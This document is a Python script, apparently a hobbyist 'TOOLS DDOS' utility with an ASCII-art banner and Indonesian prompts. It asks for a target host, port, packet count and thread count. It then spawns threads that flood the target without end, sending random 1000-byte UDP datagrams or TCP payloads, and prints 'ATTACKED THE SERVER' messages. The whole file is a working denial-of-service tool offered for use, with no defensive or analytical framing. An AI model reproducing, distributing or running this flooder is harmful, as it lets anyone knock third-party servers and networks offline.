#!/usr/bin/env python3
import random
import socket
import threading

print ("""\033\91m
──────────────────────────────────────────────────────────────────────────────────────────────
─██████████████─────────██████─██████████████─██████─────────██████─────────████████──████████
─██▒▒▒▒▒▒▒▒▒▒██─────────██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██─────────██▒▒██─────────██▒▒▒▒██──██▒▒▒▒██
─██▒▒██████▒▒██─────────██▒▒██─██▒▒██████████─██▒▒██─────────██▒▒██─────────████▒▒██──██▒▒████
─██▒▒██──██▒▒██─────────██▒▒██─██▒▒██─────────██▒▒██─────────██▒▒██───────────██▒▒▒▒██▒▒▒▒██──
─██▒▒██████▒▒██─────────██▒▒██─██▒▒██████████─██▒▒██─────────██▒▒██───────────████▒▒▒▒▒▒████──
─██▒▒▒▒▒▒▒▒▒▒██─────────██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██─────────██▒▒██─────────────████▒▒████────
─██▒▒██████▒▒██─██████──██▒▒██─██▒▒██████████─██▒▒██─────────██▒▒██───────────────██▒▒██──────
─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██─────────██▒▒██─────────██▒▒██───────────────██▒▒██──────
─██▒▒██──██▒▒██─██▒▒██████▒▒██─██▒▒██████████─██▒▒██████████─██▒▒██████████───────██▒▒██──────
─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██───────██▒▒██──────
─██████──██████─██████████████─██████████████─██████████████─██████████████───────██████──────
──────────────────────────────────────────────────────────────────────────────────────────────""")
print("===>> TOOLS DDOS <<===")
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Yakin DDoS?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Kyaa#0075 ATTACKED THE SERVER")
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(1000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Kyaa#0075 ATTACKED THE SERVER ")
		except:
			s.close()
			print("[*] ERROR SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
